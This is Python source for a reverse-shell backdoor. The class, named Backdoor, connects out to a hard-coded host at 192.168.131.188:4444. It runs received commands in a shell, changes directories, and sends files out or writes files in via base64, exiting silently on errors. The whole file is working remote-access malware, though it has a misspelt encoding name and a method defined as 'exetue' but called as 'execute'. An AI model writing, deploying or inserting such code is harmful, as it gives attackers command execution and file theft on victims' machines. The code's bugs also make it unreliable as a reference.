import socket
import subprocess
import json
import os
import base64
import sys


class Backdoor:
    def __init__(self,ip,p):
          self.s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          self.s.connect((ip,p))

    def send_data(self,data):
         try:
             pack_data = json.dumps(data.decode("utf-8"))
             self.s.send(pack_data.encode("uft-8"))

         except AttributeError:
              pack_data=json.dumps(data)
              self.s.send(pack_data.encode("utf-8"))
         except UnicodeDecodeError:
              pack_data=json.dumps(data)
              self.s.send(pack_data)

    def recv_data(self):
         pack_data=b''
         while True:

              try:
                   pack_data+=self.s.recv(1024)
                   return json.loads(pack_data)
              except ValueError:
                   continue

    def execute_cd(self,path):
         os.chdir(path)
         return "[+]changing working directory to "+path

    def read_file(self,name):
         with open(name,"rb") as file:
              return base64.b64encode(file.read())

    def write_file(self,name,content):
         with open (name,"wb") as file:
              file.write(base64.b64decode(content))

              return "[+] upload succesfully"

    def exetue(self,cmd,):
         return subprocess.check_output(cmd,shell=True)  

    def start(self):
         while True:
              cmd = self.recv_data()

              try:
                if cmd [0]== "cd" and len(cmd)>1:
                        output=self.execute_cd(cmd[1])
                elif cmd[0]=="download":
                        output=self.read_file(cmd[1])
                elif cmd[0]=="upload":
                        output=self.write_file(cmd[1],cmd[2])
                elif cmd[0]=="exit":
                     self.s.close()
                     exit()
                else:
                     output=self.execute(cmd)
              
              except Exception:
                   output="[-] error valid command execution"

              self.send_data(output)
try:
     talk=Backdoor("192.168.131.188",4444)
     talk.start()

except Exception:
       sys.exit() 

                          

          

                                
        